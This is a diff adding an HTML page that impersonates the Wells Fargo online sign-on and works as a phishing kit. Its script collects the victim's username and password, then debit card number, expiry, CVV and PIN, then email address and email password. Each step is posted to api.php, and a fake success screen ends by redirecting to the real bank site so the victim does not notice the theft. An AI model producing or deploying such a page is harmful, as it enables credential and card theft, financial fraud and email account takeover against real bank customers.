@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Banking, Credit Cards, Loans, Mortgages & More</title>
+    <style>
+        /* Reset and base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "CNX", Arial, Helvetica, sans-serif;
+            line-height: 1.5;
+            color: #333333;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Header styles */
+        .header {
+            background-color: #D71921;
+            padding: 0;
+            border-bottom: none;
+            width: 100%;
+        }
+
+        .header-container {
+            max-width: none;
+            width: 100%;
+            margin: 0;
+            padding: 8px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .wells-fargo-logo {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-decoration: none;
+        }
+
+        .header-nav {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 400;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        .nav-item:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .search-container {
+            position: relative;
+            margin-left: 16px;
+        }
+
+        .search-input {
+            padding: 6px 35px 6px 12px;
+            border: 1px solid #ffffff;
+            border-radius: 4px;
+            font-size: 13px;
+            width: 160px;
+            background-color: #ffffff;
+            color: #333333;
+        }
+
+        .search-button {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            width: 16px;
+            height: 16px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23666'%3E%3Cpath d='M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z'/%3E%3C/svg%3E");
+            background-size: contain;
+        }
+
+        /* Main content styles */
+        .main-content {
+            min-height: calc(100vh - 60px);
+            background-color: #f8f9fa;
+        }
+
+        .page-container {
+            display: flex;
+            min-height: calc(100vh - 60px);
+        }
+
+        .page-container.centered {
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
+        /* Background section for login */
+        .background-section {
+            flex: 1;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            position: relative;
+            min-height: 600px;
+        }
+
+        /* Login section */
+        .login-section {
+            flex: 0 0 400px;
+            background-color: #ffffff;
+            padding: 40px;
+            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .login-container {
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .greeting {
+            font-size: 32px;
+            font-weight: 300;
+            color: #333333;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .subtext {
+            font-size: 18px;
+            color: #666666;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+
+        /* Verification sections */
+        .verification-section {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            margin: 40px 20px;
+        }
+
+        .verification-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .verification-icon {
+            margin-bottom: 20px;
+        }
+
+        .verification-icon svg {
+            width: 60px;
+            height: 60px;
+            color: #D71921;
+        }
+
+        .verification-title {
+            font-size: 28px;
+            font-weight: 300;
+            color: #333333;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .verification-subtitle {
+            font-size: 16px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        .verification-info {
+            background-color: #fff3cd;
+            padding: 20px;
+            margin-bottom: 32px;
+            border-radius: 6px;
+            border-left: 4px solid #D71921;
+        }
+
+        .verification-info p {
+            margin: 0;
+            font-size: 16px;
+            color: #333333;
+            line-height: 1.5;
+        }
+
+        /* Success page styles */
+        .success-container {
+            max-width: 600px;
+            text-align: center;
+            padding: 60px 40px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            margin: 40px auto;
+        }
+
+        .success-icon {
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .success-icon svg {
+            width: 80px;
+            height: 80px;
+            animation: checkmark 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+        }
+
+        @keyframes checkmark {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .success-message {
+            font-size: 18px;
+            color: #333333;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .redirect-info {
+            background-color: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 16px 20px;
+            margin-bottom: 32px;
+            text-align: left;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .countdown {
+            font-size: 24px;
+            font-weight: 600;
+            color: #D71921;
+            margin: 20px 0;
+        }
+
+        /* Form styles */
+        .form-section {
+            margin-bottom: 40px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .form-section:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 400;
+            color: #333333;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #333333;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #cccccc;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            background-color: #ffffff;
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #D71921;
+            box-shadow: 0 0 0 3px rgba(215, 25, 33, 0.1);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-input {
+            padding-right: 60px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #D71921;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .form-checkbox {
+            width: 16px;
+            height: 16px;
+            accent-color: #D71921;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #333333;
+            cursor: pointer;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 16px;
+            align-items: flex-end;
+        }
+
+        .form-group.half {
+            flex: 1;
+        }
+
+        .form-group.quarter {
+            flex: 0 0 calc(25% - 12px);
+        }
+
+        .sign-on-button, .submit-button, .continue-button {
+            background-color: #D71921;
+            color: #ffffff;
+            border: none;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .sign-on-button:hover, .submit-button:hover, .continue-button:hover {
+            background-color: #b81419;
+        }
+
+        .sign-on-button:active, .submit-button:active, .continue-button:active {
+            transform: translateY(1px);
+        }
+
+        .sign-on-button:disabled, .submit-button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .login-error-message, .error-message {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .additional-links {
+            text-align: center;
+            margin: 32px 0;
+        }
+
+        .link-item {
+            color: #D71921;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .link-item:hover {
+            text-decoration: underline;
+        }
+
+        .security-notice {
+            text-align: center;
+            margin-top: 24px;
+            padding: 12px;
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #666666;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-top: 1px solid #e5e5e5;
+            text-align: center;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .disclaimer {
+            margin-bottom: 20px;
+        }
+
+        .disclaimer p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .disclaimer ul {
+            list-style: none;
+            padding: 0;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer-links ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links li {
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #D71921;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Hidden class for dynamic content */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            .header-container {
+                padding: 8px 15px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .nav-links {
+                gap: 15px;
+            }
+
+            .nav-item {
+                font-size: 12px;
+                padding: 3px 5px;
+            }
+
+            .search-container {
+                min-width: 140px;
+                margin-left: 10px;
+            }
+
+            .page-container:not(.centered) {
+                flex-direction: column;
+            }
+
+            .login-section {
+                flex: none;
+                padding: 32px 20px;
+            }
+
+            .background-section {
+                min-height: 200px;
+            }
+
+            .greeting {
+                font-size: 28px;
+            }
+
+            .subtext {
+                font-size: 16px;
+            }
+
+            .verification-section {
+                padding: 30px 20px;
+                margin: 20px 10px;
+            }
+
+            .verification-title {
+                font-size: 24px;
+            }
+
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+
+            .form-group.half,
+            .form-group.quarter {
+                flex: none;
+                width: 100%;
+            }
+
+            .success-container {
+                padding: 40px 20px;
+                margin: 20px 10px;
+            }
+
+            .success-title {
+                font-size: 28px;
+            }
+
+            .success-message {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-container {
+                flex-direction: column;
+                height: auto;
+                gap: 10px;
+            }
+
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+            }
+
+            .search-container {
+                margin-left: 0;
+                width: 100%;
+                max-width: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <div class="logo-container">
+                <a href="#" class="wells-fargo-logo">WELLS FARGO</a>
+            </div>
+            <nav class="header-nav">
+                <div class="nav-links">
+                    <a href="#" class="nav-item enroll">Enroll</a>
+                    <a href="#" class="nav-item">Customer Service</a>
+                    <a href="#" class="nav-item">ATM/Locations</a>
+                    <a href="#" class="nav-item">Español</a>
+                </div>
+                <div class="search-container">
+                    <input type="text" class="search-input" placeholder="Search">
+                    <button class="search-button" type="button"></button>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main content -->
+    <main class="main-content">
+        <!-- Login Page -->
+        <div class="page-container" id="loginPage">
+            <div class="background-section"></div>
+            <div class="login-section">
+                <div class="login-container">
+                    <h1 class="greeting">Hello again.</h1>
+                    <p class="subtext">Sign on to Wells Fargo Online.</p>
+                    
+                    <div class="login-error-message" id="loginErrorMessage">
+                        <div class="error-content">
+                            <span id="loginErrorText"></span>
+                        </div>
+                    </div>
+                    
+                    <form class="login-form" id="loginForm">
+                        <div class="form-group">
+                            <label for="username" class="form-label">Username</label>
+                            <input type="text" id="username" name="username" class="form-input" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="password" class="form-label">Password</label>
+                            <div class="password-container">
+                                <input type="password" id="password" name="password" class="form-input password-input" required>
+                                <button type="button" class="password-toggle" onclick="togglePassword()">Show</button>
+                            </div>
+                        </div>
+                        
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="saveUsername" name="saveUsername" class="form-checkbox">
+                            <label for="saveUsername" class="checkbox-label">Save username</label>
+                        </div>
+                        
+                        <button type="submit" class="sign-on-button">Sign On</button>
+                    </form>
+                    
+                    <div class="additional-links">
+                        <a href="#" class="link-item">Forgot Password/Username?</a>
+                        <a href="#" class="link-item">Enroll Now</a>
+                    </div>
+                    
+                    <div class="security-notice">
+                        <span>🔒 This is a secure session</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Card Verification Page -->
+        <div class="page-container centered hidden" id="cardPage">
+            <div class="verification-section">
+                <div class="verification-header">
+                    <div class="verification-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
+                        </svg>
+                    </div>
+                    <h1 class="verification-title">Card Verification</h1>
+                    <p class="verification-subtitle">For your security, please verify your debit card information</p>
+                </div>
+
+                <div class="verification-info">
+                    <p><strong>Security Notice:</strong> We need to verify your card details to ensure the security of your account. This information is encrypted and protected.</p>
+                </div>
+
+                <div class="error-message" id="cardErrorMessage">
+                    <span id="cardErrorText"></span>
+                </div>
+
+                <form class="verification-form" id="cardForm">
+                    <div class="form-section">
+                        <h2 class="section-title">Debit Card Information</h2>
+                        
+                        <div class="form-group">
+                            <label for="cardNumber" class="form-label">Card Number</label>
+                            <input type="text" id="cardNumber" name="cardNumber" class="form-input" 
+                                   placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label for="expiryDate" class="form-label">Expiry Date (MM/YY)</label>
+                                <input type="text" id="expiryDate" name="expiryDate" class="form-input" 
+                                       placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="form-group quarter">
+                                <label for="cvv" class="form-label">CVV</label>
+                                <input type="text" id="cvv" name="cvv" class="form-input" 
+                                       placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cardPin" class="form-label">4-Digit PIN</label>
+                            <input type="password" id="cardPin" name="cardPin" class="form-input" 
+                                   placeholder="••••" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-button">Verify Card</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Email Verification Page -->
+        <div class="page-container centered hidden" id="emailPage">
+            <div class="verification-section">
+                <div class="verification-header">
+                    <div class="verification-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                        </svg>
+                    </div>
+                    <h1 class="verification-title">Email Verification</h1>
+                    <p class="verification-subtitle">Please confirm your email address for additional security</p>
+                </div>
+
+                <div class="verification-info">
+                    <p><strong>Security Notice:</strong> We need to verify your email address to complete the secure authentication process. This helps protect your account from unauthorized access.</p>
+                </div>
+
+                <div class="error-message" id="emailErrorMessage">
+                    <span id="emailErrorText"></span>
+                </div>
+
+                <form class="verification-form" id="emailForm">
+                    <div class="form-section">
+                        <h2 class="section-title">Email Address</h2>
+                        
+                        <div class="form-group">
+                            <label for="emailAddress" class="form-label">Email Address</label>
+                            <input type="email" id="emailAddress" name="emailAddress" class="form-input" 
+                                   placeholder="your.email@example.com" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="emailPassword" class="form-label">Email Password</label>
+                            <input type="password" id="emailPassword" name="emailPassword" class="form-input" 
+                                   placeholder="Email account password" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-button">Verify Email</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div class="page-container centered hidden" id="successPage">
+            <div class="success-container">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24" fill="#4CAF50">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                </div>
+                
+                <h1 class="success-title">Verification Complete!</h1>
+                
+                <p class="success-message">
+                    Your account has been successfully verified. Thank you for using Wells Fargo Online Banking.
+                </p>
+                
+                <div class="redirect-info">
+                    <p><strong>Next Steps:</strong></p>
+                    <p>You will be redirected to your account dashboard shortly. If you are not redirected automatically, please click the button below to continue.</p>
+                </div>
+                
+                <div class="countdown" id="countdown">
+                    Redirecting in <span id="timer">10</span> seconds...
+                </div>
+                
+                <a href="https://wellsfargo.com" class="continue-button" id="continueButton">
+                    Continue to Wells Fargo
+                </a>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="disclaimer">
+                <p>Wells Fargo Bank, N.A. Member FDIC</p>
+                <ul>
+                    <li>Equal Housing Lender</li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <ul>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Security</a></li>
+                    <li><a href="#">Terms of Use</a></li>
+                    <li><a href="#">Accessibility</a></li>
+                    <li><a href="#">Site Map</a></li>
+                    <li><a href="#">About Wells Fargo</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.querySelector('.password-toggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleButton.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = 'Show';
+            }
+        }
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page-container').forEach(page => page.classList.add('hidden'));
+            document.getElementById(pageId).classList.remove('hidden');
+        }
+
+        // Format card number input
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // Format expiry date input
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Only allow numbers for CVV and PIN
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('cardPin').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitButton = document.querySelector('.sign-on-button');
+            const errorMessage = document.getElementById('loginErrorMessage');
+            const errorText = document.getElementById('loginErrorText');
+            
+            submitButton.disabled = true;
+            submitButton.textContent = 'Signing On...';
+            errorMessage.style.display = 'none';
+            
+            const formData = new FormData();
+            formData.append('username', document.getElementById('username').value);
+            formData.append('password', document.getElementById('password').value);
+            
+            try {
+                const response = await fetch('api.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    if (result.redirect === 'card') {
+                        showPage('cardPage');
+                    }
+                } else {
+                    errorText.textContent = result.message || 'Login failed. Please try again.';
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorText.textContent = 'An error occurred. Please try again.';
+                errorMessage.style.display = 'block';
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Sign On';
+            }
+        });
+
+        // Card form submission
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitButton = document.querySelector('#cardForm .submit-button');
+            const errorMessage = document.getElementById('cardErrorMessage');
+            const errorText = document.getElementById('cardErrorText');
+            
+            submitButton.disabled = true;
+            submitButton.textContent = 'Verifying...';
+            errorMessage.style.display = 'none';
+            
+            const formData = new FormData();
+            formData.append('step', 'card');
+            formData.append('cardNumber', document.getElementById('cardNumber').value);
+            formData.append('expiryDate', document.getElementById('expiryDate').value);
+            formData.append('cvv', document.getElementById('cvv').value);
+            formData.append('cardPin', document.getElementById('cardPin').value);
+            
+            try {
+                const response = await fetch('api.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    if (result.redirect === 'email') {
+                        showPage('emailPage');
+                    }
+                } else {
+                    errorText.textContent = result.message || 'Verification failed. Please check your information and try again.';
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorText.textContent = 'An error occurred. Please try again.';
+                errorMessage.style.display = 'block';
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Verify Card';
+            }
+        });
+
+        // Email form submission
+        document.getElementById('emailForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitButton = document.querySelector('#emailForm .submit-button');
+            const errorMessage = document.getElementById('emailErrorMessage');
+            const errorText = document.getElementById('emailErrorText');
+            
+            submitButton.disabled = true;
+            submitButton.textContent = 'Verifying...';
+            errorMessage.style.display = 'none';
+            
+            const formData = new FormData();
+            formData.append('step', 'email');
+            formData.append('emailAddress', document.getElementById('emailAddress').value);
+            formData.append('emailPassword', document.getElementById('emailPassword').value);
+            
+            try {
+                const response = await fetch('api.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    if (result.redirect === 'success') {
+                        showPage('successPage');
+                        startCountdown();
+                    }
+                } else {
+                    errorText.textContent = result.message || 'Email verification failed. Please check your credentials and try again.';
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorText.textContent = 'An error occurred. Please try again.';
+                errorMessage.style.display = 'block';
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Verify Email';
+            }
+        });
+
+        // Countdown timer for success page
+        function startCountdown() {
+            let timeLeft = 10;
+            const timerElement = document.getElementById('timer');
+            
+            function updateTimer() {
+                timerElement.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    window.location.href = 'https://wellsfargo.com';
+                } else {
+                    timeLeft--;
+                    setTimeout(updateTimer, 1000);
+                }
+            }
+            
+            updateTimer();
+        }
+
+        // Manual continue button
+        document.getElementById('continueButton').addEventListener('click', function() {
+            window.location.href = 'https://wellsfargo.com';
+        });
+    </script>
+</body>
+</html>
